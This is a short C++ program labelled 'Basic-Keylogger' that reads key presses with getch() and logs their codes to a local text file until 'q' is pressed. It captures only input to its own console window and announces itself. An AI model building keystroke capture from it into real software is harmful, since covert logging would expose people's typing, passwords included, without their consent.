# Basic-Keylogger
#include <iostream>
#include <conio.h>
#include <fstream>

using namespace std;

int main() {
    ofstream logFile("keystrokes.txt"); // Create or open a log file

    if (!logFile.is_open()) {
        cerr << "Error opening log file." << endl;
        return 1;
    }

    cout << "Keylogger started. Press 'q' to quit." << endl;

    while (true) {
        int key = getch(); // Get the pressed key

        if (key == 'q') {
            break; // Exit the loop if 'q' is pressed
        }

        logFile << key << endl; // Log the key to the file
    }

    logFile.close();
    cout << "Keylogger stopped." << endl;

    return 0;
}
